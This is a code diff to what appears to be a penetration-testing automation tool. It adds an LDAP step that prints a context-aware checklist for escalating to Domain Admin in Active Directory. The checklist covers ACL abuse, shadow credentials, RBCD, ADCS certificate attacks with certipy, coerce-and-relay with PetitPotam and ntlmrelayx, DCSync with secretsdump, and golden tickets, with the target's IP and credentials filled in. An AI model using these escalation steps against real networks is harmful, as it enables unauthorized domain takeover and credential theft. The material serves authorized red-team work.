@@ -3554,16 +3554,8 @@ _EXPLOIT_STEPS = {
         ("AS-REP roast (no creds) + Kerberoast (any cred) → crackable hashes", "ldap-roast"),
         # ── loot secrets from LDAP ──
         ("Loot: LAPS + gMSA + description secrets + BloodHound collect", "ldap-loot"),
-        # ── ACL & object abuse (write rights) ──
-        "ACL abuse: GenericAll/Write, WriteDACL/Owner, ForceChangePassword, AddMember (bloodyAD / dacledit)",
-        "Shadow credentials: write msDS-KeyCredentialLink → PKINIT auth (pywhisker / certipy)",
-        "RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity → S4U impersonation",
-        # ── ADCS ──
-        "Enumerate CA & templates (certipy find) → ESC1-ESC16 → cert as any user → PKINIT → DA",
-        # ── relay / DCSync ──
-        "Relay coerced auth to LDAP(S) when signing / channel-binding is off → RBCD / shadow cred",
-        "With replication rights (DS-Replication-Get-Changes*) → DCSync all hashes",
-        "Manual steps & further research",
+        # ── ACL abuse / shadow creds / RBCD / ADCS / coerce+relay / DCSync ──
+        ("Manual steps & further research", "ldap-next"),
     ],
     "kerberos": [
         # ── no creds ──
@@ -14333,6 +14325,92 @@ def _tool_ldap_loot(ip: str, port: int, proto: str) -> str:
     return f"LDAP loot — {ip}:{port}\n\n" + "\n".join(lines)
 
 
+# ── LDAP step 4: manual steps & further research (reference only, context-aware) ─
+def _tool_ldap_next(ip: str, port: int, proto: str) -> str:
+    """LDAP step-4 tool: NOT a scan — a read-only checklist of AD escalation to Domain Admin, with
+    this host's findings substituted in (ACL abuse, shadow creds, RBCD, ADCS, coerce+relay, DCSync),
+    plus roast/LAPS/gMSA loot to crack & reuse and unconfirmed ⚠. Pure DB synthesis; no network."""
+    scripts = fetch_scripts(ip, port, proto)
+    by_sid = {}
+    for sid, out in scripts:
+        by_sid.setdefault(sid, out or "")
+    enum, roast, loot = by_sid.get("ldap-enum", ""), by_sid.get("ldap-roast", ""), by_sid.get("ldap-loot", "")
+
+    mdom = re.search(r"domain:\s*(\S+)", enum)
+    dom = mdom.group(1) if (mdom and mdom.group(1) != "?") else None
+    dc = dom or "<domain>"
+    domcreds = [(d, u, s) for d, u, s in _gather_all_smb_creds() if s]
+    cred = f"{domcreds[0][1]}" if domcreds else None
+    asrep = re.findall(r"^✗ ASREP (\S+)", roast, re.M)
+    tgs = re.findall(r"^✗ TGS (\S+)", roast, re.M)
+    laps = re.findall(r"^✗ LAPS (\S+)", loot, re.M)
+    gmsa = re.findall(r"^✗ GMSA (\S+)", loot, re.M)
+
+    kev = _load_kev()
+    found = set()
+    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
+        if p == port and pr == proto and cv:
+            found |= {c.strip() for c in cv.split(",") if c.strip()}
+    for _sid, out in scripts:
+        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
+    found = sorted(found, key=_cve_sort_key)
+
+    warns = []
+    for sid, out in scripts:
+        for ln in (out or "").splitlines():
+            if ln.strip().startswith("⚠"):
+                warns.append(f"{DIM}[{sid}]{RESET} {ln.strip()}")
+    warns = warns[:14]
+
+    sub = (f"{DIM}domain: {dc}  ·  cred: {cred or 'none'}  ·  roast: {len(asrep) + len(tgs)}  ·  "
+           f"LAPS/gMSA: {len(laps) + len(gmsa)}")
+    L = [f"LDAP {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}", sub + RESET]
+
+    L.append(f"\n{BOLD}A. Turn findings into access{RESET}")
+    if laps or gmsa:
+        L.append(f"  {CYAN}LAPS/gMSA creds{RESET} {DIM}→ PsExec / PtH to that host (spawn-shell via SMB){RESET}")
+    if asrep or tgs:
+        L.append(f"  {CYAN}{len(asrep) + len(tgs)} roast hash(es){RESET} {DIM}→ hashcat → domain creds → re-enum/loot{RESET}")
+    L.append(f"  {DIM}BloodHound: mark owned, run 'Shortest Path to Domain Admins'{RESET}")
+
+    L.append(f"\n{BOLD}B. ACL / object abuse (write rights on a principal){RESET}")
+    L.append(f"  {DIM}GenericAll/GenericWrite → ForceChangePassword / AddMember / set SPN (targeted Kerberoast){RESET}")
+    L.append(f"  {DIM}Shadow creds: bloodyAD/certipy set msDS-KeyCredentialLink → PKINIT → NT hash (pywhisker){RESET}")
+    L.append(f"  {DIM}RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity → S4U2self/proxy → impersonate{RESET}")
+
+    L.append(f"\n{BOLD}C. ADCS (certificate services){RESET}")
+    L.append(f"  {DIM}certipy find -vulnerable -u {cred or '<user>'} -dc-ip {ip} → ESC1-ESC16 → "
+             f"request a cert as any user → PKINIT → DA{RESET}")
+
+    L.append(f"\n{BOLD}D. Coerce & relay{RESET}")
+    L.append(f"  {DIM}PetitPotam / PrinterBug / DFSCoerce → ntlmrelayx to LDAP(S) (signing/CB off) → "
+             f"set RBCD or shadow cred; or relay to ADCS ESC8 → cert{RESET}")
+
+    L.append(f"\n{BOLD}E. DCSync (replication rights){RESET}")
+    L.append(f"  {DIM}DS-Replication-Get-Changes* (DA / granted) → secretsdump / nxc --ntds → all NT "
+             f"hashes incl. krbtgt → golden ticket{RESET}")
+
+    L.append(f"\n{BOLD}F. CVEs surfaced in this phase{RESET}")
+    if found:
+        for c in found:
+            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
+            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
+    else:
+        L.append(f"  {DIM}none surfaced — check ZeroLogon / noPac / PrintNightmare via the SMB phase (smb-dccve){RESET}")
+
+    L.append(f"\n{BOLD}G. Verify unconfirmed findings from this phase{RESET}")
+    if warns:
+        for w in warns:
+            L.append(f"  {w}")
+    else:
+        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")
+
+    L.append(f"\n{BOLD}H. Re-run & housekeeping{RESET}")
+    L.append(f"  {DIM}new creds (roast/LAPS/gMSA) → re-run ldap-enum/loot & spray as them; add {dc} + DC to "
+             f"/etc/hosts and sync the clock for Kerberos{RESET}")
+    return "\n".join(L)
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -14500,6 +14578,7 @@ _STEP_TOOLS = {
     "ldap-enum": ("AD enum via netexec ldap — domain, users, AS-REP flags, password policy", _tool_ldap_enum),
     "ldap-roast": ("AS-REP roast + Kerberoast → crackable hashes (netexec ldap)", _tool_ldap_roast),
     "ldap-loot": ("LAPS + gMSA + description secrets + BloodHound collect (netexec ldap)", _tool_ldap_loot),
+    "ldap-next": ("manual AD escalation steps (context-aware, reference only)", _tool_ldap_next),
     "spawn-shell": ("spawn a shell — router across all service footholds (interactive)", _tool_spawn_shell),
 }
 
@@ -14601,6 +14680,7 @@ _STEP_TOOL_RUNS = {
     "ldap-enum":        ("netexec ldap", f"{_mins(_LDAPENUM_DEADLINE)} min"),
     "ldap-roast":       ("netexec ldap", None),
     "ldap-loot":        ("netexec ldap", f"{_mins(_LDAPENUM_DEADLINE)} min"),
+    "ldap-next":        ("reference · no scan", None),
     "spawn-shell":      ("router → service foothold", None),
 }
 
@@ -14680,7 +14760,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         return
     tlabel, runner = _STEP_TOOLS[tool_key]
 
-    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "mssql-next", "ssh-next"):  # foreground: interactive / print-now
+    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "mssql-next", "ssh-next", "ldap-next"):  # foreground: interactive / print-now
         prev = fetch_step_status(ip, port, proto, key).get(n)
         set_step_status(ip, port, proto, key, n, "running")
         try:
@@ -14689,7 +14769,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
             print(f"{RED}✗ {tool_key} error: {exc}{RESET}")
             set_step_status(ip, port, proto, key, n, prev)
             return
-        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "mssql-next", "ssh-next"):  # a list to read now, not a scan result
+        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "mssql-next", "ssh-next", "ldap-next"):  # a list to read now, not a scan result
             print("\n" + out)
             out = re.sub(r"\x1b\[[0-9;]*m", "", out)           # store clean text (no ANSI) in DETAILS
         save_scripts(ip, [{"id": tool_key, "port": port, "proto": proto, "output": out}])
